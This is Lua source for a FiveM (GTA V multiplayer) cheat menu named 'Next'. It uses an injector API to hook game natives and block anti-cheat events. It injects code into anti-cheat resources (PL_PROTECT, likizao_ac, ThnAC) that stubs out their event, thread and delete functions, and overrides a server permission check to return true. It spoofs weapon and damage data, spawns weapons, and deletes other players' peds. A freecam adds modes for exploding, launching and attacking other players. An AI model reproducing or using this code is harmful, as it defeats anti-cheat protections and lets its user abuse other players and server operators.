FrameAPI.AddServerEventListener(function(eventName, eventPayload, resourceName)
    if resourceName == "PL_PROTECT" and #eventPayload > 10 then
        print("Event blocked: " .. eventName .. " Payload: " .. eventPayload)
        return false
    elseif resourceName == "eqpg-pro" and #eventPayload > 9 then
        print("Event blocked: " .. eventName .. " Payload: " .. eventPayload)
        return false
    elseif resourceName == "likizao_ac" and #eventPayload > 9 then
        print("Event blocked: " .. eventName .. " Payload: " .. eventPayload)
        return false
    end
    return true
end)

FrameAPI.AddCommandListener(function(commandName, rawCommand, resourceName)
    if resourceName == "PL_PROTECT" then
        print("Command blocked: " .. commandName .. " rawCommand: " .. rawCommand)
        return false
    elseif resourceName == "likizao_ac" then
        local afterSpace = rawCommand:match("^%S+%s+(.+)$")
        if afterSpace and #afterSpace > 9 then
            print("Command blocked: " .. commandName .. " rawCommand: " .. rawCommand)
            return false
        end
    end
    return true
end)

local __nativeCreateThread = Citizen.CreateThread or CreateThread
local nt = {
    createTh = function(func)
        return __nativeCreateThread(func)
    end
}
local next = {}
_G.next = next
next.bypass = {
['weapon'] = function(active)
    if active then
        FrameAPI.Scripting.HookNative(0xF25DF915FA38C5F3, false)
        FrameAPI.Scripting.HookNative(0x79CFD9827CC979B6, 2)
        FrameAPI.Scripting.HookNative(0xDCCFD3F106C36AB4, false)
        FrameAPI.Scripting.HookNative(0x4899CB088EDF59B8, false)
        FrameAPI.Scripting.HookNative(0x475768A975D5AD17, false)
        FrameAPI.Scripting.HookNative(0x3A87E44BB9A01D54, GetHashKey("weapon_unarmed"))
        FrameAPI.Scripting.HookNative(0x8483E98E8B888AE2, GetHashKey("weapon_unarmed"))
        FrameAPI.Scripting.HookNative(0x937C71165CF334B3, false)
        FrameAPI.Scripting.HookNative(0x8DECB02F88F428BC, false)
        FrameAPI.Scripting.HookNative(0xB0760331C7AA4155, false)
        FrameAPI.Scripting.HookNative(0x0A6DB4965674D243, GetHashKey("weapon_unarmed"))
        FrameAPI.Scripting.HookNative(0xB80CA294F2F26749, false)
        FrameAPI.Scripting.HookNative(0x34616828CD07F1A1, false)
        FrameAPI.Scripting.HookNative(0x6C4D0409BA1A2BC2, false)
        FrameAPI.Scripting.HookNative(0x2E1202248937775C, 0)
        FrameAPI.Scripting.HookNative(0x015A522136D7F951, 0)
        FrameAPI.Scripting.HookNative(0x7FEAD38B326B9F74, GetHashKey("weapon_unarmed"))
        FrameAPI.Scripting.HookNative(0x7E9DFE24AC1E58EF, false)
        FrameAPI.Scripting.HookNative(0x131D401334815E94, false)
        FrameAPI.Scripting.HookNative(0x4E209B2C1EAD5159, false)
    else                                                        
        FrameAPI.Scripting.RestoreNative(0xF25DF915FA38C5F3)
        FrameAPI.Scripting.RestoreNative(0x3317DEDB88C95038)
        FrameAPI.Scripting.RestoreNative(0x4899CB088EDF59B8)
        FrameAPI.Scripting.RestoreNative(0x475768A975D5AD17)
        FrameAPI.Scripting.RestoreNative(0x3A87E44BB9A01D54)
        FrameAPI.Scripting.RestoreNative(0x8483E98E8B888AE2)
        FrameAPI.Scripting.RestoreNative(0x937C71165CF334B3)
        FrameAPI.Scripting.RestoreNative(0x8DECB02F88F428BC)
        FrameAPI.Scripting.RestoreNative(0xB0760331C7AA4155)
        FrameAPI.Scripting.RestoreNative(0x0A6DB4965674D243)
        FrameAPI.Scripting.RestoreNative(0xB80CA294F2F26749)
        FrameAPI.Scripting.RestoreNative(0x34616828CD07F1A1)
        FrameAPI.Scripting.RestoreNative(0x6C4D0409BA1A2BC2)
        FrameAPI.Scripting.RestoreNative(0x2E1202248937775C)
        FrameAPI.Scripting.RestoreNative(0x015A522136D7F951)
        FrameAPI.Scripting.RestoreNative(0x7FEAD38B326B9F74)
        FrameAPI.Scripting.RestoreNative(0x7E9DFE24AC1E58EF)
        FrameAPI.Scripting.RestoreNative(0xB2C086CC1BF8F2BF)
        FrameAPI.Scripting.RestoreNative(0x131D401334815E94)
        FrameAPI.Scripting.RestoreNative(0x4E209B2C1EAD5159)
        FrameAPI.Scripting.RestoreNative(0xDCCFD3F106C36AB4)
    end
end,
['vehicle_enter'] = function(active)
    if active then
        FrameAPI.Scripting.HookNative('SetPedCanBeKnockedOffVehicle', false)
        FrameAPI.Scripting.HookNative('SetPedCanRagdoll', 0)
        FrameAPI.Scripting.HookNative('SetPedCanBeTargetted', 0)
        FrameAPI.Scripting.HookNative('SetVehicleCanBeTargetted', true)
        FrameAPI.Scripting.HookNative('SetVehicleIsConsideredByPlayer', true)
        FrameAPI.Scripting.HookNative('SetVehicleCanBeVisiblyDamaged', true)
    else
        FrameAPI.Scripting.RestoreNative('SetPedCanBeKnockedOffVehicle')
        FrameAPI.Scripting.RestoreNative('SetPedCanRagdoll')
        FrameAPI.Scripting.RestoreNative('SetPedCanBeTargetted')
        FrameAPI.Scripting.RestoreNative('SetVehicleCanBeTargetted')
        FrameAPI.Scripting.RestoreNative('SetVehicleIsConsideredByPlayer')
        FrameAPI.Scripting.RestoreNative('SetVehicleCanBeVisiblyDamaged')
    end
end,
    ['getControl'] = function(entity)
        SetPlayersLastVehicle(entity)
        _G.NetworkClearFollowers()
        _G.NetworkClearPropertyId()
        _G.SetNetworkIdExistsOnAllMachines(_G.NetworkGetNetworkIdFromEntity(entity), true)
        _G.SetNetworkIdCanMigrate(_G.NetworkGetNetworkIdFromEntity(entity), true)
        _G.NetworkSetChoiceMigrateOptions(_G.PlayerPedId(), true)
        _G.NetworkSetScriptIsSafeForNetworkGame()
        local netId = _G.NetworkGetNetworkIdFromEntity(entity)
        _G.SetNetworkIdAlwaysExistsForPlayer(netId, _G.PlayerPedId(), true)
        _G.NetworkUseHighPrecisionBlending(netId, true)
        entityCoords = _G.GetEntityCoords(entity)
        _G.RequestCollisionAtCoord(entityCoords)
        _G.NetworkRequestControlOfEntity(entity)
        _G.NetworkRequestControlOfNetworkId(netId)
        Citizen.InvokeNative(0xA670B3662FAFFBD0, netId)
        Citizen.InvokeNative(0xB69317BF5E782347, entity)
        if _G.NetworkHasControlOfEntity(entity) then
            return netId
        elseif Citizen.InvokeNative(0x01BF60A500E28887, entity) then
            return netId
        end
    end,
    ['attach'] = function(active)
        if active then
            FrameAPI.Scripting.HookNative('AttachEntityToEntity', false)
            FrameAPI.Scripting.HookNative('AttachEntityToEntityPhysically', false)
            FrameAPI.Scripting.HookNative('DetachEntity', false)
            FrameAPI.Scripting.HookNative('AttachEntityToEntityWithBone', false)
            FrameAPI.Scripting.HookNative('AttachEntityToEntityWithBoneRot', false)
            FrameAPI.Scripting.HookNative('AttachEntityToEntityWithBonePos', false)
            FrameAPI.Scripting.HookNative('AttachEntityToEntityWithBonePosRot', 0)
        else
            FrameAPI.Scripting.HookNative('AttachEntityToEntity')
            FrameAPI.Scripting.HookNative('AttachEntityToEntityPhysically')
            FrameAPI.Scripting.HookNative('DetachEntity')
            FrameAPI.Scripting.HookNative('AttachEntityToEntityWithBone')
            FrameAPI.Scripting.HookNative('AttachEntityToEntityWithBoneRot')
            FrameAPI.Scripting.HookNative('AttachEntityToEntityWithBonePos')
            FrameAPI.Scripting.HookNative('AttachEntityToEntityWithBonePosRot')
        end
    end
}
local __next_bypass = next.bypass
next = {
    welcome_screen = true,
    x = 220,
    y = 50,
    w = 800,
    h = 565,
    render = true,
    active = true,
    enabled = true,
    vars = {
        mode = "Padrão",
        christmas_mode = false,
        snowflakes = {},
        prev_menuX = 0,
        prev_menuY = 0,
    },
    keys = {
        ['Esc'] = 0x1B,
        ['Caps Lock'] = 0x14,
        ['Ctrl'] = 0x11,
        ['0'] = 0x30, ['1'] = 0x31, ['2'] = 0x32, ['3'] = 0x33, ['4'] = 0x34,
        ['5'] = 0x35, ['6'] = 0x36, ['7'] = 0x37, ['8'] = 0x38, ['9'] = 0x39,
        ['A'] = 0x41, ['B'] = 0x42, ['C'] = 0x43, ['D'] = 0x44, ['E'] = 0x45,
        ['F'] = 0x46, ['G'] = 0x47, ['H'] = 0x48, ['I'] = 0x49, ['J'] = 0x4A,
        ['K'] = 0x4B, ['L'] = 0x4C, ['M'] = 0x4D, ['N'] = 0x4E, ['O'] = 0x4F,
        ['P'] = 0x50, ['Q'] = 0x51, ['R'] = 0x52, ['S'] = 0x53, ['T'] = 0x54,
        ['U'] = 0x55, ['V'] = 0x56, ['W'] = 0x57, ['X'] = 0x58, ['Y'] = 0x59,
        ['Z'] = 0x5A,
        [' '] = 0x20,
        ['_'] = 0xBD,
        ['F1'] = 0x70,
        ['F2'] = 0x71,
        ['F3'] = 0x72,
        ['F4'] = 0x73,
        ['F5'] = 0x74,
        ['F6'] = 0x75,
        ['F7'] = 0x76,
        ['NUM0'] = 0x60,
        ['NUM1'] = 0x61,
        ['NUM2'] = 0x62,
        ['NUM3'] = 0x63,
        ['NUM4'] = 0x64,
        ['NUM5'] = 0x65,
        ['NUM6'] = 0x66,
        ['NUM7'] = 0x67,
        ['NUM8'] = 0x68,
        ['NUM9'] = 0x69,
        ['Mouse X1'] = 0x05,
        ['Mouse X2'] = 0x06,
        ['Mouse Left'] = 0x01,
        ['Mouse Right'] = 0x02,
        ['Mouse Scroll'] = 0x04
    },
    bind = 0x31,
    dpi = 1.19,
    server_info = {
        ac = {},
        group = {},
        city = {},
        players = {},
    },
    values = {
        slider = {},
        checkbox = {},
        input = {},
        colorpicker = {},
        combobox = {}
    },
   weatherTypes = {
    { name = "Extra Ensolarado", id = "EXTRASUNNY" },
    { name = "Limpo", id = "CLEAR" },
    { name = "Neutro", id = "NEUTRAL" },
    { name = "Poluição (Smog)", id = "SMOG" },
    { name = "Neblina", id = "FOGGY" },
    { name = "Nublado", id = "OVERCAST" },
    { name = "Nuvens", id = "CLOUDS" },
    { name = "Limpando", id = "CLEARING" },
    { name = "Chuva", id = "RAIN" },
    { name = "Trovão", id = "THUNDER" },
    { name = "Neve", id = "SNOW" },
    { name = "Nevasca", id = "BLIZZARD" },
    { name = "Neve Leve", id = "SNOWLIGHT" },
    { name = "Natal", id = "XMAS" },
    { name = "Halloween", id = "HALLOWEEN" }
},
    colors = {
        background = {10, 10, 10},
        theme = {255, 0, 0},
        extras = {11, 11, 11},
        components = {18, 18, 18},
        groupbox = {12, 12, 12}
    }
}
next.bypass = __next_bypass
_G.next = next
    next.functions = {
['Draw3DText'] = function(x, y, z, scale, text, r, g, b)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    if onScreen then
        SetTextScale(scale, scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(r, g, b, 255)
        SetTextDropshadow(0, 0, 0, 0, 155)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end,
['RequestAndPlayAnim'] = function(ped, dict, anim, flag)
    RequestAnimDict(dict)
    while not HasAnimDictLoaded(dict) do Wait(10) end
    TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, flag, 0, false, false, false)
end,
['display_message'] = function(texto, comBorda)
        local sW, sH = GetActiveScreenResolution()
        local font = 'default'
        local textSize = 18.0
        local textWidth = FrameAPI['Fonts']['GetTextWidthSize'](texto, textSize, font)
        local paddingX = 50
        local rectW = textWidth + paddingX
        local rectH = 40
        local rectX = (sW / 2) - (rectW / 2)
        local rectY = 850, 40
        local bgR, bgG, bgB = 15, 15, 15
        local accentR, accentG, accentB = next.colors.theme[1], next.colors.theme[2], next.colors.theme[3], 255
        FrameAPI['Drawing']['DrawRect']('msg_background', rectX, rectY, rectW, rectH, bgR, bgG, bgB, 240, 6.0, 9990)
        if comBorda then
            FrameAPI['Drawing']['DrawRect']('msg_accent_l', rectX, rectY + 8, 4, rectH - 16, accentR, accentG, accentB, 255, 2.0, 9991)
            FrameAPI['Drawing']['DrawRect']('msg_accent_r', rectX + rectW - 4, rectY + 8, 4, rectH - 16, accentR, accentG, accentB, 255, 2.0, 9991)
        end
        local textX = (sW / 2) - (textWidth / 2)
        FrameAPI['Drawing']['DrawText']('msg_content', texto, textX, rectY + 10, textSize, false, 255, 255, 255, 255, font, 9992)
    end,
        ['GetVehicle'] = function()
            local a = PlayerPedId()
            if IsPedInAnyVehicle(a, false) then
                return GetVehiclePedIsIn(a, false)
            else
                return 0
            end
        end,
        ['OcupadoVehicle'] = function(veiculo)
            local motorista = GetPedInVehicleSeat(veiculo, -1)
            return motorista ~= nil and motorista ~= 0 and not IsEntityDead(motorista)
        end,
        ['RotationToDirection'] = (function(rotation)
                                local radZ = math.rad(rotation.z)
                                local radX = math.rad(rotation.x)
                                local dirX = -math.sin(radZ) * math.abs(math.cos(radX))
                                local dirY = math.cos(radZ) * math.abs(math.cos(radX))
                                local dirZ = math.sin(radX)
                                return {x = dirX, y = dirY, z = dirZ}
                            end),
    ['camFreeCast'] = (function(distance)
        local camRot = GetGameplayCamRot(2)
        local camCoord = GetGameplayCamCoord()
        local forwardVector = next.functions.RotationToDirection(camRot)
        local endPoint = {
            x = camCoord.x + forwardVector.x * distance,
            y = camCoord.y + forwardVector.y * distance,
            z = camCoord.z + forwardVector.z * distance
        }
        return true, vector3(endPoint.x, endPoint.y, endPoint.z)
    end),
['RGBnext'] = (function(frequency)
                            local result = {}
                            local curtime = GetGameTimer() / 1000
                            result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
                            result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
                            result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
                            return result
                        end),
        ['resource_get'] = (function(resource)
            if GetResourceState(resource) then
                return true
            end
            return false
        end),
        ['stop_resource'] = (function(res)
            FrameAPI['StopResource'](res)
        end),
        ['hook'] = (function(hash, retorno, active)
            if hash and retorno and active then
                FrameAPI.Scripting.HookNative(hash, retorno)
            elseif hash and not active then
                FrameAPI.Scripting.HookNative(hash)
            end
        end),
        ['rot_to_dir'] = (function(rotation)
            local z = math.rad(rotation.z)
            local x = math.rad(rotation.x)
            local num = math.abs(math.cos(x))
            return vector3(
            -math.sin(z) * num,
            math.cos(z) * num,
            math.sin(x)
            )
        end)
    }
    next.cargos = {
        get_username = function()
            local name = FrameAPI.GetUsername()
            return name
        end,
        get_role = function()
            local users = {
                ["Jhon47"] = "Owner",
                ["hn2"] = "Owner",
                ["Pecinha123"] = "Owner",
                ["dudurlk"] = "Amigo da Next",
                ["LevyLife"] = "Amigo da Next",
                ["guinext"] = "Amigo da Next",
                ["bmnext"] = "Amigo da Next",
                ["Japa"] = "Amigo da Next",
                ["Thegod"] = "Amigo da Next"
            }
            for username, cargo in pairs(users) do
                if next.cargos.get_username() == username then
                    return cargo
                end
            end
            return "Cliente"
        end,
        get_hwid = function()
            local id = FrameAPI.GetUserHWID()
            if string.len(id) > 30 then
                return string.sub(id, 1, 30) .. " [...]"
            else
                return id
            end
        end
    }
        next.essentials = {
        ['render_cursor'] = (function(active)
            FrameAPI['Drawing']['SetCursor'](active == true)
        end),
    }
    next.utils = {
        ['add_rect'] = (function(id, x, y, w, h, r, g, b, a, rounding, order, filled, outline)
            local dpi = next.dpi or 1.0
            FrameAPI['Drawing']['DrawRect'](id, x * dpi, y * dpi, w * dpi, h * dpi, r, g, b, a, rounding, order, filled, outline)
        end),
    }
    next = next or {}
    next.elements = {}
    next.lib = {
        selected_player = {},
        selected_vehicle = {},
    }
    next.controlled_vehicles = {}
next.BypassEspectar = function(active)
    if active then
        next['functions']['hook']('SetPedCanBeTargetted', false)
        next['functions']['hook']('SetEntityInvincible', false)
        next['functions']['hook']('SetEntityProofs', false)
    else
        next['functions']['hook']('SetPedCanBeTargetted', false)
        next['functions']['hook']('SetEntityInvincible', false)
        next['functions']['hook']('SetEntityProofs', false)
    end
end
next.BypassTeleport = function(active)
if active then
    FrameAPI.Scripting.HookNative('SetEntityCoords', false)
    FrameAPI.Scripting.HookNative('SetEntityCoordsNoOffset', false)
    FrameAPI.Scripting.HookNative('SetEntityCoordsWithOffset', false)
    FrameAPI.Scripting.HookNative('SetEntityCoordsWithoutOffset', false)
    FrameAPI.Scripting.HookNative('SetEntityVelocity', false)
    FrameAPI.Scripting.HookNative('SetEntityHeading', true)
    FrameAPI.Scripting.HookNative('SetPedCanBeKnockedOffVehicle', false)
    FrameAPI.Scripting.HookNative('SetEntityCollision', false)
    FrameAPI.Scripting.HookNative('SetEntityDynamics', false)
else
    FrameAPI.Scripting.RestoreNative('SetEntityCoords')
    FrameAPI.Scripting.RestoreNative('SetEntityCoordsNoOffset')
    FrameAPI.Scripting.RestoreNative('SetEntityCoordsWithOffset')
    FrameAPI.Scripting.RestoreNative('SetEntityCoordsWithoutOffset')
    FrameAPI.Scripting.RestoreNative('SetEntityVelocity')
    FrameAPI.Scripting.RestoreNative('SetEntityHeading')
    FrameAPI.Scripting.RestoreNative('SetPedCanBeKnockedOffVehicle')
    FrameAPI.Scripting.RestoreNative('SetEntityCollision')
    FrameAPI.Scripting.RestoreNative('SetEntityDynamics')
end
end
next.BypassAnticheat = function(active)
    if active then
    FrameAPI.Inject('PL_PROTECT', [[
    TriggerEvent = function(...) return end
    RegisterNetEvent = function(...) return end
    AddEventHandler = function(...) return end
    Citizen.CreateThread = function(...) return end
    RegisterCommand = function(...) return end
    exports = setmetatable({}, {
    __index = function()
    return function(...) return end
    end
    })
    ]])

    FrameAPI.Inject('PL_PROTECT', [[
    local originalDoesEntityExist = DoesEntityExist
    DoesEntityExist = function(entity)
    return true
    end
    local originalDeleteEntity = DeleteEntity
    DeleteEntity = function(entity)
    return false
    end
    local originalDeletePed = DeletePed
    DeletePed = function(ped)
    return false
    end
    ]])

    FrameAPI.Inject('PL_PROTECT', [[
    if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
    _G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
    end
    TriggerServerEvent = function(eventName, ...)
    return
    end
    ]])

    FrameAPI.Inject('likizao_ac', [[
    TriggerEvent = function(...) return end
    RegisterNetEvent = function(...) return end
    AddEventHandler = function(...) return end
    Citizen.CreateThread = function(...) return end
    RegisterCommand = function(...) return end
    exports = setmetatable({}, {
    __index = function()
    return function(...) return end
    end
    })
    ]])

    FrameAPI.Inject('likizao_ac', [[
    local originalDoesEntityExist = DoesEntityExist
    DoesEntityExist = function(entity)
    return true
    end
    local originalDeleteEntity = DeleteEntity
    DeleteEntity = function(entity)
    return false
    end
    local originalDeletePed = DeletePed
    DeletePed = function(ped)
    return false
    end
    ]])

    FrameAPI.Inject('likizao_ac', [[
    if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
    _G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
    end
    TriggerServerEvent = function(eventName, ...)
    return
    end
    ]])

    else
    FrameAPI.Inject('PL_PROTECT', [[
    if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
    TriggerServerEvent = _G._ORIGINAL_TRIGGER_SERVER_EVENT
    _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
    end
    ]])

    FrameAPI.Inject('likizao_ac', [[
    if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
    TriggerServerEvent = _G._ORIGINAL_TRIGGER_SERVER_EVENT
    _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
    end
    ]])
    end
end
function RotationToDirection(rotation)
    local z = math.rad(rotation.z)
    local x = math.rad(rotation.x)
    local num = math.abs(math.cos(x))
    return vector3(
    -math.sin(z) * num,
     math.cos(z) * num,
     math.sin(x)
    )
end
    next.colorbypass = function(active)
        if active then
        next['functions']['hook'](0xF3CC740D36221548, false, true)
    else
        next['functions']['hook'](0xF3CC740D36221548, false, false)
        end
    end
    next.SpawnVehicleLikizao = function(name)
        FrameAPI.Inject('ThnAC', [[
        thnCreateVehicle = function(...) return end
        ]])
        local nameveh = GetHashKey(name)
        RequestModel(nameveh)
        while not HasModelLoaded(nameveh) do
            Wait(10)
        end
        local veh = CreateVehicle(nameveh, 12222.2, 1323123.3, 3123133.0, true, true)
        local veh2 = CreateVehicle(nameveh, 12222.2, 1323123.3, 3123133.0, true, true)
        Wait(1000)
        local coords = GetEntityCoords(PlayerPedId())
        SetEntityCoords(veh, coords.x, coords.y, coords.z, true, true, true, false)
        SetEntityCoords(veh2, coords.x, coords.y, coords.z, true, true, true, false)
        SetModelAsNoLongerNeeded(nameveh)
        return veh, veh2
    end
    next.mudarSkinEgpg = function(hash)
    FrameAPI.Inject('vrp', string.format([[
    tvRP.Skin("%s")
    ]],hash))
    end
    next.mudarSkin2 = function(hash)
        if next.functions["resource_get"]("monitor") then
            FrameAPI.Inject("monitor", string.format([[
                CreateThread(function ()
                local modelHash = GetHashKey("%s")
                while not HasModelLoaded(modelHash) do
                    RequestModel(modelHash)
                    Wait(10)
                end
                if HasModelLoaded(modelHash) then
                    SetPlayerModel(PlayerId(), modelHash)
                    SetModelAsNoLongerNeeded(modelHash)
                                                    SetPedDefaultComponentVariation(PlayerPedId())
                end
            end)
        ]],hash))
        else
            nt.createTh(function()
                local modelHash = GetHashKey(hash)
                while not HasModelLoaded(modelHash) do
                    RequestModel(modelHash)
                    Wait(10)
                end
                if HasModelLoaded(modelHash) then
                    SetPlayerModel(PlayerId(), modelHash)
                    SetModelAsNoLongerNeeded(modelHash)
                    SetPedDefaultComponentVariation(PlayerPedId())
                end
            end)
        end
    end

local hookedNatives = {
    { name = "HasPedGotWeapon", value = false },
    { name = "GetSelectedPedWeapon", value = `WEAPON_UNARMED` },
    { name = "GetCurrentPedWeapon", value = `WEAPON_UNARMED` },
    { name = "HudWeaponWheelGetSelectedHash", value = `WEAPON_UNARMED` },
    { name = "GetAmmoInClip", value = 0 },
    { name = "GetPedAmmoByType", value = 0 }
}

local function setWeaponsBypass(enabled)
    if bypassActive == enabled then
        return
    end
    bypassActive = enabled
    if enabled then
        for i = 1, #hookedNatives do
            local native = hookedNatives[i]
            FrameAPI.Scripting.HookNative(native.name, native.value)
        end
        FrameAPI.SyncTree.SpoofServerWeapon(true)
        FrameAPI.SyncTree.SpoofServerDamage(true, `WEAPON_UNARMED`)
        FrameAPI.BlockGameEvent("CEventNetworkEntityDamage", true)
    else
        for i = 1, #hookedNatives do
            local native = hookedNatives[i]
            FrameAPI.Scripting.RestoreNative(native.name)
        end
        FrameAPI.SyncTree.SpoofServerWeapon(false)
        FrameAPI.SyncTree.SpoofServerDamage(false, `WEAPON_UNARMED`)
        FrameAPI.BlockGameEvent("CEventNetworkEntityDamage", false)
    end
end

next.spawnWeaponAll = function(Arma)

    if group == "Santa Group" then
    FrameAPI.SyncTree.SpoofWeapon(true)
    FrameAPI.SyncTree.SpoofServerDamage(true, GetHashKey("WEAPON_ANIMAL"))
    FrameAPI.Inject("safezone", [[
    function _G.vSERVER.HasPermission()
    return true
    end
    ]])
    local code = string.format([[
    Citizen.CreateThread(function()
    local weaponHash = "%s" 
    GiveWeaponToPed(PlayerPedId(), weaponHash, -1, false, true)
    SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
    end)
    ]], Arma)
    FrameAPI.Inject("player", code)
    end
end

next.spawnWeapon = function(Arma, Muni)
if anticheat == "PL_PROTECT" then
    setWeaponsBypass(true)
    FrameAPI.SyncTree.SpoofServerWeapon(true)
    FrameAPI.SyncTree.SpoofServerDamage(true, GetHashKey("WEAPON_UNARMED"))
    GiveWeaponToPed(PlayerPedId(), Arma, Muni, false, true)
    end

    if group == "Santa Group" then
    FrameAPI.SyncTree.SpoofWeapon(true)
    FrameAPI.SyncTree.SpoofServerDamage(true, GetHashKey("WEAPON_ANIMAL"))
    FrameAPI.Inject("safezone", [[
    function _G.vSERVER.HasPermission()
    return true
    end
    ]])
    local code = string.format([[
    Citizen.CreateThread(function()
    local weaponHash = "%s" 
    local Muni = %s
    GiveWeaponToPed(PlayerPedId(), weaponHash, Muni, false, true)
    SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
    SetPedInfiniteAmmo(PlayerPedId(), true, weaponHash)
    end)
    ]], Arma, Muni)
    FrameAPI.Inject("player", code)
    end

    if group == "Lotus Group" then
    FrameAPI.SyncTree.SpoofWeapon(true)
    FrameAPI.SyncTree.SpoofServerDamage(true, GetHashKey("WEAPON_ANIMAL"))
    FrameAPI.Inject('vrp', string.format([[
    local weapons_to_give = {
    ["%s"] = { 
    ammo = %s          
    }
    }
    tvRP.giveWeapons(weapons_to_give, false) 
    ]], Arma, Muni))
    end

    if anticheat == "EQPG" then
    setWeaponsBypass(true)
    FrameAPI.SyncTree.SpoofWeapon(true)
    FrameAPI.SyncTree.SpoofServerDamage(true, GetHashKey("WEAPON_UNARMED"))
    GiveWeaponToPed(PlayerPedId(), Arma, Muni, false, true)
    end


if anticheat == "ThnAC" then
    FrameAPI.SyncTree.SpoofWeapon(true)
    next.bypass.weapon(true)
    GiveWeaponToPed(PlayerPedId(), Arma, Muni, false, true)
    FrameAPI.SyncTree.SpoofServerDamage(true, GetHashKey("WEAPON_HEN"))
    end

    if anticheat == "Fiveguard" then
    GiveWeaponToPed(PlayerPedId(), Arma, Muni, false, true)
    end

if anticheat == "Não Detectado" then
    FrameAPI.SyncTree.SpoofWeapon(true)
    FrameAPI.SyncTree.SpoofServerDamage(true, GetHashKey("WEAPON_UNARMED"))
    Citizen.CreateThread(function()
    GiveWeaponToPed(PlayerPedId(), Arma, Muni, false, true)
    SetCurrentPedWeapon(PlayerPedId(), Arma, true)
    end)
    end

    if city == "Serve Testing" then
        local ped = PlayerPedId()
        GiveWeaponToPed(ped, Arma, Muni, false, true)
        FrameAPI.SyncTree.SpoofWeapon(true)
        Wait(100)
        FrameAPI.SyncTree.SpoofServerDamage(true, GetHashKey("WEAPON_ANIMAL"))
        end
    if next.values.checkbox['bugWeapon'] then
    Wait(0)
    SetCurrentPedWeapon(PlayerPedId(), name, true)
    end
    end

next.spawnWeaponVip = function(Arma, Muni)
    GiveWeaponToPed(PlayerPedId(), Arma, -1, false, true)
end

    next.removerplayer = function(entity)
        local a = PlayerPedId()
        local veh = GetVehiclePedIsIn(entity, false)
        local c = GetEntityCoords(a)
        next.bypass['vehicle_enter'](true)
        SetEntityCoordsNoOffset(a, GetEntityCoords(veh))
        SetPedIntoVehicle(a, veh, 0)
        Wait(10)
        DeletePed(entity)
        DeleteEntity(entity)
        Wait(10)
        SetPedIntoVehicle(PlayerPedId(), veh, -1)
        Wait(20)
        SetEntityCoordsNoOffset(a, c.x, c.y, c.z)
        next.bypass['vehicle_enter'](false)
    end
    next.vars = next.vars or {}
    next.vars.tab_selected = "Jogador"
    next.vars.subtab_selected = "Geral"

next.freecam = next.freecam or {
    enabled = false,
    running = false,
    speed = 1.0,
    blockMovement = true,
    cam = nil,
    pitch = 0.0,
    yaw = 0.0,
    mode = 1,
    selectedPlayer = nil,
    heldEntity = nil,
    heldDistance = 10.0,
    lastClick = false,
    lastModeChange = 0,
    lastSubChange = 0,
}

local _nextFreecam = next.freecam

_nextFreecam.modes = {
    "Look Around",
    "Teleport",
    "Launch Player",
    "Delete Entity",
    "Shoot Vehicle",
    "Boost Vehicle",
    "Heli Attacker",
    "Explode",
    "Shoot",
    "Kick From Vehicle",
    "Npc Hijack",
    "Bring Vehicle",
    "Black Hole",
    "Physic gun"
}

_nextFreecam.shootVehicles = {"t20", "cavalcade3", "r50", "panto"}
_nextFreecam.shootVehicleIndex = 1

_nextFreecam.heliModels = {"valkyrie", "buzzard", "conada", "volatus"}
_nextFreecam.heliIndex = 1

_nextFreecam.explodeMethods = {"Method 1", "Method 2", "Method 3", "Silent Explosion"}
_nextFreecam.explodeIndex = 1

_nextFreecam.shootMethods = {"Pistol", "Fuzil", "RPG", "RPG 2", "RPG 3"}
_nextFreecam.shootIndex = 1

_nextFreecam.vehicleModels = {
    "adder", "zentorno", "r50", "cavalcade3", "panto", "sultan", "elegy", "infernus", "buffalo2", "banshee", "comet2",
    "kuruma", "dubsta", "feltzer2", "futo", "gauntlet", "rapidgt", "carbonizzare", "issi2",
    "ruiner", "schafter2", "t20", "vacca"
}
_nextFreecam.vehicleIndex = 1

_nextFreecam.objectModels = {
    {name = "Big Ring", model = "ar_prop_ar_neon_gate4x_04a"},
    {name = "Big Ring 2", model = "ar_prop_ar_neon_gate4x_03a"},
    {name = "Race Line", model = "sr_prop_sr_start_line_02"},
    {name = "Desert", model = "xs_terrain_set_dystopian_06"},
    {name = "Statue", model = "xs_propint4_waste_06_statue"},
    {name = "Statue 2", model = "xs_propint3_waste_01_statues"},
}
_nextFreecam.objectIndex = 1

_nextFreecam.pedModels = {
    {name = "Fat Latin", model = "a_m_m_fatlatin_01"},
    {name = "Jesus", model = "u_m_m_jesus_01"},
    {name = "Cat", model = "a_c_cat_01"},
    {name = "Cow", model = "a_c_cow"},
    {name = "Free Mode", model = "mp_m_freemode_01"},
    {name = "Monkey", model = "a_c_chimp"},
    {name = "Alien", model = "s_m_m_movalien_01"},
}
_nextFreecam.pedIndex = 1

local function fcNotify(text, kind)
    local ok = pcall(function()
        if my and my.interact and my.interact.notify then
            my.interact.notify(tostring(text), kind or "info", 3000)
        elseif next.elements and next.elements.notify then
            next.elements.notify(tostring(text), kind or "info", 3000)
        end
    end)
    if not ok then
        print("[Next FreeCam] " .. tostring(text))
    end
end

local function fcVec(x, y, z)
    return vector3(x + 0.0, y + 0.0, z + 0.0)
end

local function fcRotToDir(rot)
    local rz = math.rad(rot.z)
    local rx = math.rad(rot.x)
    local c = math.abs(math.cos(rx))
    return fcVec(-math.sin(rz) * c, math.cos(rz) * c, math.sin(rx))
end

local function fcRightFromYaw(yaw)
    local rz = math.rad(yaw + 90.0)
    return fcVec(-math.sin(rz), math.cos(rz), 0.0)
end

local function fcRequestControl(entity, timeout)
    if not entity or entity == 0 or not DoesEntityExist(entity) then return false end
    timeout = tonumber(timeout) or 800
